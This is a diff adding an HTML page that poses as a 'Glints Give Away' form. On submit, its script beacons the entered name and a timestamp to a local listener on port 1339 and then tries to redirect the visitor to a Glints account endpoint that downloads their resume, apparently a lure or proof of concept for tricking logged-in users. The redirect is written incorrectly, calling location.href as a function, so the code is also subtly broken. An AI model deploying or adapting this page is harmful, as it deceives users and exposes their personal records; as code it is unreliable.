@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Glints Give Away</title>
+</head>
+<body>
+
+    <h3>Glints Give Away Form</h3>
+
+    <form id="beaconForm">
+        <label>Full Name:</label><br>
+        <input
+            type="text"
+            id="name"
+            placeholder="John Doe"
+            required
+        >
+
+        <br><br>
+
+        <button type="submit">Click Here</button>
+    </form>
+
+    <p id="status"></p>
+
+    <script>
+        const form = document.getElementById("beaconForm");
+
+        form.addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const name = document.getElementById("name").value.trim();
+
+            if (!name) return;
+
+            const data = {
+                name: name,
+                time: new Date().toISOString()
+            };
+
+            const status = document.getElementById("status");
+            status.textContent = "Sent Data...";
+
+            try {
+                const response = await fetch(
+                    "http://localhost:1339/beacon",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(data)
+                    }
+                );
+
+                if (!response.ok) {
+                    throw new Error("HTTP " + response.status);
+                }
+
+                window.location.href(
+                    "https://glints.com/api/me/resume/download"
+                );
+
+            } catch (error) {
+                status.textContent = "Failed.";
+                console.error(error);
+            }
+        });
+    </script>
+
+</body>
+</html>
